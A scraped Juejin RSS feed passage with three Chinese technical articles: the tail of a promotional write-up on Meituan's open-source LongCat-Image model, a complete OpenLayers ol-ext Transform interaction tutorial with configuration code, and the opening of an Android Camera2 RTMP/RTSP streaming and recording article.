<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2eb4af56bfd8444e9148dd85023b4a55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu054KJ6IGK56eR5oqA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765843317&amp;x-signature=JeXvVo3MZ9Z%2BLatLYGaG1jbsrlw%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-3">四、应用场景：从电商到传统文化的全领域覆盖</h3>
<p>LongCat-Image的应用场景广泛，尤其在中文环境下表现出色。以下是几个主要领域的应用案例：</p>
<p><strong>电商领域</strong>：模型可快速生成商品展示图与促销海报，支持商家通过简单提示词即可调整商品布局、文字信息等。例如，输入"一张以蓝色为主色调的促销海报，宣传的是宠爱季活动，右上角品牌为 'MAOMAO'。画面中央，特写一只非常可爱的大眼睛橘猫从克莱因蓝色的撕开的纸中探出..."等复杂指令，模型能够精准生成符合电商需求的高质量图像  。目前，LongCat APP已提供24个零门槛玩法模板，让普通用户也能一键生成专业海报，实现"专业AI创作零门槛"。</p>
<p><strong>餐饮领域</strong>：模型能够生成食材宣传素材，如"海报以浅米色为背景，中央展示几颗荔枝，其中一颗剥开，露出洁白多汁的果肉..."等场景，自动适配文字排版与食材场景融合，提升餐饮营销素材的生产效率  。</p>
<p><strong>传统文化领域</strong>：模型特别适合古诗词插图、对联、门店招牌、文字Logo等设计场景。<strong>其能够处理生僻字和书法字体渲染，自动根据古风文案适配书法字体，实现文字与场景的自然融合</strong>  。例如，输入"一座古色古香的传统中式门楼，平摄视角，上方悬挂着一块写有..."等指令，模型能够生成符合传统文化审美的图像。</p>
<p>下图是使用LongCat APP对图片处理的效果图，总体上效果还是很不错的。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5732ec6af741434bb67ca46982c1334b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu054KJ6IGK56eR5oqA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765843317&amp;x-signature=VpSw%2BPI%2BNuGN4ijlg%2B0zH0g7aI8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><strong>游戏领域</strong>：模型可辅助生成游戏场景与角色初稿，支持通过自然语言指令进行多轮编辑，如调整角色服装、改变场景风格等，为游戏开发者提供高效的创作工具。</p>
<h3 data-id="heading-4">五、开源意义与技术贡献：中文AIGC生态的新机遇</h3>
<p>美团选择将LongCat-Image开源并采用MIT许可协议，具有重要的行业意义。<strong>MIT协议允许开发者自由用于个人研究或商业应用，只需保留原始版权声明，这大大降低了企业应用的法律门槛</strong>  。相比之下，Stable Diffusion采用Apache 2.0协议，虽然也允许商业使用，但需要更复杂的合规流程。</p>
<p>LongCat-Image的技术贡献主要体现在三个方面：</p>
<p>首先，模型证明了通过架构创新与数据优化，轻量化模型同样能承载复杂场景需求，降低了AIGC技术的落地成本  。这为中小企业和开发者提供了更经济高效的选择。</p>
<p>其次，模型填补了中文图像生成与编辑领域的优质开源资源空白，特别是其在中文文本渲染方面的优势，为传统文化数字化、商业广告创作等场景提供了技术支撑  。</p>
<p>第三，模型采用的混合骨干架构和渐进式训练策略，为图像生成与编辑一体化提供了新的技术路径，可能启发未来更多创新模型的诞生。</p>
<h3 data-id="heading-5">六、总结：轻量化模型的生态价值</h3>
<p>LongCat-Image的发布标志着美团在AIGC领域完成关键技术布局，其6B参数的轻量化设计、中文场景的深度适配与开源策略的组合，为行业提供了新的发展范式  。<strong>相较于动辄百亿参数的重型模型，它证明了通过架构创新与数据优化，轻量化模型同样能承载复杂场景需求，降低了AIGC技术的落地成本</strong>  。</p>
<p>对于开发者社区而言，LongCat-Image的开源填补了中文图像生成与编辑领域的优质开源资源空白，有望吸引更多开发者参与共建，推动中文AIGC技术的标准化与产业化  。而对于普通用户与企业来说，"简单提示词即可高效出图"的特性，让AI创作从专业工具转变为人人可用的生产力助手，为内容创作行业带来效率革命  。</p>
<p>随着LongCat系列模型的不断迭代与开源，美团正在构建一个完整的大模型技术生态，从文本到图像再到视频，覆盖多模态生成与编辑能力。这对于中国AI技术的发展具有重要意义，也为各行业数字化转型提供了新的技术路径。</p>
<p><strong>资源链接：</strong></p>
<p><strong>Hugging Face:</strong></p>
<p><em><a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fmeituan-longcat%2FLongCat-Image" target="_blank" title="https://huggingface.co/meituan-longcat/LongCat-Image" ref="nofollow noopener noreferrer">huggingface.co/meituan-lon…</a></em></p>
<p><strong>GitHub:</strong></p>
<p><em><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeituan-longcat%2FLongCat-Image" target="_blank" title="https://github.com/meituan-longcat/LongCat-Image" ref="nofollow noopener noreferrer">github.com/meituan-lon…</a></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[openlayer选择移动图标]]></title>    <link>https://juejin.cn/post/7581412054902390793</link>    <guid>https://juejin.cn/post/7581412054902390793</guid>    <pubDate>2025-12-09T02:35:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054902390793" data-draft-id="7581412054901915657" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openlayer选择移动图标"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T02:35:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端灵派派"/> <meta itemprop="url" content="https://juejin.cn/user/3069492197857832"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openlayer选择移动图标
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3069492197857832/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端灵派派
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:35:21.000Z" title="Tue Dec 09 2025 02:35:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们通常使用OpenLayers的内置交互，但有时需要扩展功能。ol-ext是一个OpenLayers的扩展库，其中包含了一些额外的交互和控件。<code>ol-ext</code> 库中的 Transform 交互组件，用于在地图上对要素进行交互式变换（旋转、缩放、平移）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ea4d3bd0eaf46139293e6079cc2a757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv54G15rS-5rS-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852521&amp;x-signature=8nItaQWFHnpTwpgodJHFIpnIMew%3D" alt="动画2.gif" loading="lazy"/></p>
<ol>
<li>首先，确保已经安装了ol-ext。如果没有，可以通过npm安装</li>
</ol>
<pre><code class="hljs language-js" lang="js">npm install ol-ext
</code></pre>
<ol start="2">
<li>导入ExtTransform。</li>
<li>创建一个ExtTransform交互对象，并可以配置一些选项。</li>
<li>将该交互添加到地图中。</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">ExtTransform</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'ol-ext/interaction/Transform'</span>

 <span class="hljs-variable language_">this</span>.<span class="hljs-property">transform</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExtTransform</span>({
     <span class="hljs-comment">// 交互模式</span>
      <span class="hljs-attr">enableRotatedTransform</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// 启用旋转后的变换</span>
      <span class="hljs-attr">translate</span>: <span class="hljs-literal">true</span>,                 <span class="hljs-comment">// 启用平移手柄</span>
      <span class="hljs-attr">stretch</span>: <span class="hljs-literal">true</span>,                   <span class="hljs-comment">// 启用拉伸（角手柄）</span>
      <span class="hljs-attr">scale</span>: <span class="hljs-literal">true</span>,                     <span class="hljs-comment">// 启用缩放（边手柄）</span>
      <span class="hljs-attr">rotate</span>: <span class="hljs-literal">true</span>,                    <span class="hljs-comment">// 启用旋转手柄</span>
  
      <span class="hljs-comment">// 行为控制</span>
      <span class="hljs-attr">keepAspectRatio</span>: <span class="hljs-literal">false</span>,          <span class="hljs-comment">// 拉伸时保持宽高比（按住Shift键）</span>
      <span class="hljs-attr">translateFeature</span>: <span class="hljs-literal">false</span>,         <span class="hljs-comment">// 点击要素内部时是否平移</span>
      <span class="hljs-attr">translateAnchor</span>: <span class="hljs-literal">false</span>,          <span class="hljs-comment">// 是否平移锚点</span>
      <span class="hljs-attr">noFlip</span>: <span class="hljs-literal">false</span>,                   <span class="hljs-comment">// 禁止几何图形翻转</span>
  
      <span class="hljs-comment">// 样式</span>
      <span class="hljs-attr">style</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Style</span>({              <span class="hljs-comment">// 控制点的样式</span>
        <span class="hljs-attr">image</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>({
          <span class="hljs-attr">radius</span>: <span class="hljs-number">6</span>,
          <span class="hljs-attr">fill</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fill</span>({
            <span class="hljs-attr">color</span>: <span class="hljs-string">'#ff0000'</span>
          }),
          <span class="hljs-attr">stroke</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stroke</span>({
            <span class="hljs-attr">color</span>: <span class="hljs-string">'#ffffff'</span>,
            <span class="hljs-attr">width</span>: <span class="hljs-number">2</span>
          })
        })
      }),
  
      <span class="hljs-comment">// 过滤器</span>
      <span class="hljs-attr">filter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">feature, layer</span>) {
        <span class="hljs-comment">// 返回 true 表示该要素可变换</span>
        <span class="hljs-keyword">return</span> feature.<span class="hljs-title function_">get</span>(<span class="hljs-string">'transformable'</span>) === <span class="hljs-literal">true</span>
      }
   })
   <span class="hljs-variable language_">this</span>.<span class="hljs-property">map</span>.<span class="hljs-title function_">addInteraction</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transform</span>)

   <span class="hljs-variable language_">this</span>.<span class="hljs-property">transform</span>.<span class="hljs-title function_">setActive</span>(<span class="hljs-literal">false</span>)

  <span class="hljs-comment">//移动结束</span>
   <span class="hljs-variable language_">this</span>.<span class="hljs-property">transform</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'translateend'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>)=&gt;</span>{
     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">coordinate_</span>);
    
     <span class="hljs-comment">// 获取变换后的几何图形</span>
      <span class="hljs-keyword">const</span> geometry = e.<span class="hljs-property">feature</span>.<span class="hljs-title function_">getGeometry</span>()
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'变换后的坐标'</span>, geometry.<span class="hljs-title function_">getCoordinates</span>())
  });
  
 
    <span class="hljs-comment">// 删除变换控制点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transform</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'stop'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'变换交互停止'</span>)
    })
  
</code></pre>
<p>ExtTransform交互提供了多种事件，比如正在变换（'transforming'）
变换过程中(transform)、变换结束（'transformend'），我们可以监听这些事件来执行一些操作（比如更新要素的属性或保存状态）。</p>
<p>ExtTransform可以动态控制变换</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 启用/禁用特定变换类型</span>
<span class="hljs-keyword">this</span>.transform.setTranslate(<span class="hljs-literal">true</span>)
<span class="hljs-keyword">this</span>.transform.setScale(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">this</span>.transform.setRotate(<span class="hljs-literal">true</span>)
<span class="hljs-keyword">this</span>.transform.setStretch(<span class="hljs-literal">false</span>)

<span class="hljs-comment">// 设置要变换的要素</span>
<span class="hljs-keyword">const</span> features = <span class="hljs-keyword">this</span>.vectorSource.getFeatures()
<span class="hljs-keyword">this</span>.transform.setFeatures(features) <span class="hljs-comment">// 所有要素</span>
<span class="hljs-comment">// 或</span>
<span class="hljs-keyword">this</span>.transform.setFeatures([feature1, feature2]) <span class="hljs-comment">// 特定要素</span>

<span class="hljs-comment">// 清空当前变换的要素</span>
<span class="hljs-keyword">this</span>.transform.clear()

<span class="hljs-comment">// 激活/停用交互</span>
<span class="hljs-keyword">this</span>.transform.setActive(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// 激活</span>
<span class="hljs-keyword">this</span>.transform.setActive(<span class="hljs-literal">false</span>) <span class="hljs-comment">// 停用</span>

<span class="hljs-comment">// 设置锚点位置（默认在要素中心）</span>
<span class="hljs-keyword">this</span>.transform.setAnchor([x, y])
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android音视频开发：基于 Camera2 API 实现RTMP推流、RTSP服务与录像一体化方案]]></title>    <link>https://juejin.cn/post/7581378364082241582</link>    <guid>https://juejin.cn/post/7581378364082241582</guid>    <pubDate>2025-12-09T01:46:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581378364082241582" data-draft-id="7581363652781555722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android音视频开发：基于 Camera2 API 实现RTMP推流、RTSP服务与录像一体化方案"/> <meta itemprop="keywords" content="机器学习,深度学习,计算机视觉"/> <meta itemprop="datePublished" content="2025-12-09T01:46:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="音视频牛哥"/> <meta itemprop="url" content="https://juejin.cn/user/2867982505609000"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android音视频开发：基于 Camera2 API 实现RTMP推流、RTSP服务与录像一体化方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2867982505609000/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    音视频牛哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T01:46:03.000Z" title="Tue Dec 09 2025 01:46:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在移动端音视频领域，单纯的 RTMP 推流已不再是技术天花板。真正的挑战在于：<strong>如何在资源受限的 Android 设备上，构建一个既能“对外”进行 RTMP 直播、又能“对内”提供低延迟 RTSP 分发，同时还能完成“本地”高保真录像的『全功能媒体节点』？</strong></p>
<p>面对这一需求，传统的串行处理模式往往会导致 CPU 负载过高、画面卡顿甚至 OOM。本文将深入源码，结合 <code>MainActivity.java</code> 及核心辅助类，剖析如何利用 <strong>Android Camera2 API</strong> 的高效采集能力，配合 <strong>大牛直播SDK (SmartPublisher)</strong> 的多路分发架构，打造一套集<strong>采集、编码、推流、服务、存储</strong>于一体的高可靠、低延迟音视频解决方案。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a9410c603b04030a4efcf4aa01a826f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z-z6KeG6aKR54mb5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765849562&amp;x-signature=z24NaTrsfd8i566sAvJ4L5Y0gWA%3D" alt="" loading="lazy"/><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/>​编辑</p>
<h2 data-id="heading-0">1. 整体架构设计</h2>
<p>在提供的源码中，<code>MainActivity</code> 充当了控制中心的角色，而核心的音视频处理逻辑被封装在 <code>LibPublisherWrapper</code> 和 <code>SmartPublisherJniV2</code> 中。整体数据流向如下：</p>
<ol>
<li>
<p><strong>数据采集</strong>：<code>Camera2Helper</code> 负责调用 Camera2 API，通过 <code>ImageReader</code> 获取 <code>YUV_420_888</code> 格式的视频帧。</p>
</li>
<li>
<p><strong>数据前处理</strong>：<code>LayerPostThread</code> 负责处理视频层叠加（如时间戳、文字水印、图片Logo）。</p>
</li>
<li>
<p><strong>核心编码与分发</strong>：<code>SmartPublisherJniV2</code> (Native层) 接收处理后的YUV数据，进行H.264/H.265编码，并同时分发给：</p>
<ul>
<li>
<p><strong>RTMP Publisher</strong>：推送到CDN或流媒体服务器。</p>
</li>
<li>
<p><strong>RTSP Server</strong>：内置轻量级RTSP服务，供局域网内拉流。</p>
</li>
<li>
<p><strong>Recorder</strong>：写入MP4文件进行本地存储。</p>
</li>
</ul>
</li>
</ol>
<p>这种架构的优势在于<strong>一次采集、一次编码、多路复用</strong>，极大地降低了CPU和内存的开销。</p>
<h2 data-id="heading-1">2. Camera2 API 的高效采集与YUV处理</h2>
<p>Camera2 API 相比旧版 Camera API 提供了更强大的控制力，但也更为复杂。源码中的 <code>Camera2Helper.java</code> 封装了繁琐的 Session 创建和 Surface 配置。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03f107ef6100428484b0b19b56ecefd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z-z6KeG6aKR54mb5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765849562&amp;x-signature=gYfir94ZMMaK%2F7I2sxaly%2BtK2Q8%3D" alt="" loading="lazy"/><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/>​编辑</p>
